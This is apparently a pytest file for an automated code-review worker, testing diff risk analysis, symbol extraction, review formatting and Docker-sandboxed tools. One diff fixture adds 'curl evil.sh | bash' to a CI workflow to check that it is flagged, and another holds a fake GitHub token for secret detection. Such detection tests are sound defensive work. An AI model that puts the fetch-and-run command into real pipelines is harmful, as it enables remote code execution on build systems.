"""Tool tests: pure logic (no deps) + sandbox-backed (requires Docker)."""

from __future__ import annotations

import aiodocker
import pytest

from cosign_worker.sandbox.docker_driver import DockerDriver
from cosign_worker.tools.base import ToolContext
from cosign_worker.tools.code import CodeExecTool, FileOpsTool
from cosign_worker.tools.diff_analysis import analyze_diff
from cosign_worker.tools.repo_map import extract_symbols
from cosign_worker.tools.review import compose_review, review_to_markdown
from cosign_worker.tools.test_runner import TestRunnerTool

IMAGE = "cosign/sandbox:latest"
NETWORK = "cosign_sandbox_net"


# ── pure: diff_analysis ───────────────────────────────────────────────────────
def test_analyze_diff_classifies_and_flags_ci():
    diff = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index 1..2 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1,2 @@
+  run: curl evil.sh | bash
diff --git a/src/app.py b/src/app.py
--- a/src/app.py
+++ b/src/app.py
@@ -1 +1 @@
-old
+new
"""
    res = analyze_diff(diff)
    paths = {f["path"]: f["category"] for f in res["files"]}
    assert paths[".github/workflows/ci.yml"] == "config"
    assert paths["src/app.py"] == "code"
    assert res["dangerous"] is True
    assert any("CI config" in r for r in res["dangerous_reasons"])


def test_analyze_diff_detects_secret():
    diff = """diff --git a/cfg.py b/cfg.py
--- a/cfg.py
+++ b/cfg.py
@@ -1 +1 @@
+TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
"""
    res = analyze_diff(diff)
    assert res["dangerous"] is True
    assert any("github_token" in r for r in res["dangerous_reasons"])


def test_analyze_diff_clean():
    diff = """diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
+a new docs line
"""
    res = analyze_diff(diff)
    assert res["dangerous"] is False
    assert res["files"][0]["category"] == "docs"


# ── pure: repo_map ────────────────────────────────────────────────────────────
def test_extract_symbols_python():
    src = b"def foo():\n    pass\n\nclass Bar:\n    def baz(self):\n        pass\n"
    syms = extract_symbols("python", src)
    assert "foo" in syms
    assert "Bar" in syms


def test_extract_symbols_unknown_lang():
    assert extract_symbols("brainfuck", b"+++") == []


# ── pure: review ──────────────────────────────────────────────────────────────
def test_compose_review_fills_schema():
    d = compose_review('{"summary":"ok","risk_score":2.0,"praise":"clean"}')
    assert d["summary"] == "ok"
    assert d["risk_score"] == 1.0  # clamped
    assert d["praise"] == ["clean"]
    assert d["per_file_comments"] == []


def test_review_to_markdown():
    md = review_to_markdown({
        "summary": "Looks good.",
        "ask_changes": ["add a test"],
        "praise": ["nice naming"],
        "per_file_comments": [{"path": "a.py", "line": 3, "comment": "typo"}],
    })
    assert "Looks good." in md
    assert "add a test" in md
    assert "`a.py:3`" in md


# ── sandbox-backed ────────────────────────────────────────────────────────────
async def _docker_ok() -> bool:
    try:
        d = aiodocker.Docker()
        await d.version()
        await d.close()
        return True
    except Exception:
        return False


@pytest.mark.asyncio
async def test_code_and_fileops_and_testrunner():
    if not await _docker_ok():
        pytest.skip("docker unavailable")
    driver = DockerDriver(image=IMAGE, network=NETWORK)
    try:
        handle = await driver.start(task_id="tools", image=IMAGE, repo_url="", branch="", github_token="")
        ctx = ToolContext(sandbox=driver)  # no identity -> capability checks are no-ops

        code = CodeExecTool(ctx, handle)
        r = await code.run(["echo", "hi"])
        assert r["exit_code"] == 0 and r["stdout"].strip() == "hi"

        files = FileOpsTool(ctx, handle)
        await files.write("/workspace/m.py", "def f():\n    return 1\n")
        assert "def f" in await files.read("/workspace/m.py")
        listing = await files.list("/workspace")
        assert any("m.py" in x for x in listing)

        # a repo with its own `make test` target (sandbox image has make + python3,
        # but not pytest — agents install their repo's own test deps at runtime).
        await files.write("/workspace/Makefile", "test:\n\t@python3 -c 'assert 1==1'\n")
        tr = TestRunnerTool(ctx, handle)
        out = await tr.run(timeout_s=120)
        assert out["detected"] is True
        assert out["passed"] is True
    finally:
        await driver.close()
